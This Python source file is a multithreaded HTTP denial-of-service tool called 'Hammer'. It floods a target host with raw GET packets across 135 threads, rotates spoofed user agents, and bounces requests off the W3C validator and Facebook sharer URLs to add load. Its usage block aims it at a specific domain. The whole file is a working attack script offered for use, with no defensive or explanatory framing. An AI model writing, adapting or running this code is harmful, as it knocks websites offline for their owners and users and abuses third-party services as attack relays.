# from fake_useragent import UserAgent

# def user_agent():
#     ua = UserAgent()
#     uagent = []
#     for _ in range(7):  # Generate 7 random user agents
#         uagent.append(ua.random)
#     return uagent

# # Example usage
# random_uagents = user_agent()
# for ua in random_uagents:
#     print(ua)
import socket
import threading
import time
import random
from queue import Queue
from typing import List
import requests


class Hammer:
    def __init__(self, host: str, port: int = 80, turbo: int = 135):
        self.host = host
        self.port = port
        self.turbo = turbo
        self.uagent = self.user_agent()
        self.bots = self.my_bots()
        self.q = Queue()
        self.w = Queue()
        self.headers = self.load_headers()

    def user_agent(self) -> List[str]:
        return [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        ]

    def my_bots(self) -> List[str]:
        return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
        ]

    def load_headers(self) -> str:
        with open("headers.txt", "r") as headers:
            return headers.read()

    def bot_hammering(self, url: str):
        while True:
            try:
                req = requests.get(url, headers={'User-Agent': random.choice(self.uagent)})
                print("bot is hammering...")
                time.sleep(.1)
            except Exception as e:
                print(f"Error in bot_hammering: {e}")
                time.sleep(.1)

    def down_it(self):
        while True:
            try:
                packet = str("GET / HTTP/1.1\nHost: "+self.host+"\n\n User-Agent: "+random.choice(self.uagent)+"\n"+self.headers).encode('utf-8')
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    if s.send(packet):
                        print("packet sent! hammering")
                    else:
                        print("shut down")
                    time.sleep(.1)
            except socket.error as e:
                print("no connection! server maybe down")
                time.sleep(.1)

    def run(self):
        print(f"{self.host} port: {self.port} turbo: {self.turbo}")
        print("Please wait...")
        threads = []
        for i in range(self.turbo):
            t = threading.Thread(target=self.down_it)
            t.start()
            threads.append(t)
            t2 = threading.Thread(target=self.bot_hammering, args=(random.choice(self.bots) + "http://" + self.host,))
            t2.start()
            threads.append(t2)

        for thread in threads:
            thread.join()

# Usage
if __name__ == '__main__':
    hammer = Hammer('cyber1101.com', 80, 135)
    hammer.run()
